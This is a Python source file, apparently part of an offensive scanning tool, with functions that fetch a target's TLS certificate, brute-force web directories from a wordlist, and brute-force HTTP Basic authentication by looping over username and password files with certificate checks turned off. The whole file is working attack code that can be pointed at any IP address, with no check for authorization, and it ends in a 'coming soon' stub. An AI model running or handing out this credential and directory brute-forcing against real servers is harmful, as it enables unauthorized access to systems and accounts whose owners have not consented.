import requests
import os
import ssl
from urllib.request import socket



def ssl_info(ip):
    # Get SSL certificate details
    try:
        context = ssl.create_default_context()
        with socket.create_connection((ip, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                print(f"SSL Certificate Info: {cert}")
    except Exception as e:
        print(f"Failed to retrieve SSL info: {e}")

def brute_force_https_directories(ip, wordlist_file):
    # Try to brute-force common directories over HTTPS
    print(f"Brute-forcing directories on https://{ip}...")
    with open(wordlist_file, 'r') as f:
        directories = [line.strip() for line in f]

    for directory in directories:
        url = f"https://{ip}/{directory}"
        try:
            response = requests.get(url, verify=False)
            if response.status_code == 200:
                print(f"Found directory: {url}")
        except Exception as e:
            print(f"Error testing directory {directory}: {e}")

def brute_force_https_auth(ip, username_file, password_file):
    # Brute-force HTTPS Basic Authentication
    print(f"Starting brute-force attack on HTTPS basic auth at https://{ip}...")
    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [line.strip() for line in uf]
        passwords = [line.strip() for line in pf]

    for username in usernames:
        for password in passwords:
            try:
                print(f"Trying {username}:{password}...")
                response = requests.get(f"https://{ip}", auth=(username, password), verify=False)
                if response.status_code == 200:
                    print(f"Login successful with {username}:{password}")
                    return True
            except Exception as e:
                print(f"Error occurred during brute-force attempt: {e}")
                return False
    print("Brute-force attack finished, no valid credentials found.")
    return False

def https_info(ip):
    # Gather IP and scan for HTTPS vulnerabilities
    
    if True:
        # Get SSL certificate details
        ssl_info(ip)
        
        # Directory brute-forcing
        wordlist_file = 'common_dirs.txt'
        brute_force_https_directories(ip, wordlist_file)
        
        # Brute force login attempt (if basic auth is enabled)
        username_file = 'usernames.txt'
        password_file = 'passwords.txt'
        brute_force_https_auth(ip, username_file, password_file)
    else:
        print("HTTPS service not detected or port 443 is closed.")






def https(target,p,v):
    https_info(target)
    print('coming soon...')